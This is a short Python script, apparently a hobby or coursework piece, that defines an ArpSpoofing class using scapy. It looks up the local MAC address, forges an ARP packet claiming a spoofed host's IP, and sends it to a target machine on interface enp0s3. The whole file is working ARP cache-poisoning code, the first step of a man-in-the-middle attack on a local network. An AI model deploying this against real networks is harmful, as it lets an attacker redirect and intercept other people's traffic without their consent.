import sys
from scapy.all import *

class ArpSpoofing:

    def __init__(self):
        pass

    def doSpoof(self, hostToAttack, hostToSpoof):

        #This method obtains your own mac address
        def obtainMac():
            my_macs = [get_if_hwaddr(i) for i in get_if_list()]
            for mac in my_macs:
                if (mac != "00:00:00:00:00:00"):
                    return mac

        print("spoof")

        myMac = obtainMac()
        print("post obtainMac")

        #Ether part of packet
        etherPart = Ether(src=myMac)

        #Arp part of packet
        arpPart = ARP(op="who-has", hwsrc=myMac, psrc=hostToSpoof, pdst=hostToAttack)

        #total packet
        packet = etherPart / arpPart

        #sends packet
        sendp(packet, iface="enp0s3", verbose=False)
        print("Spoof Spoof")




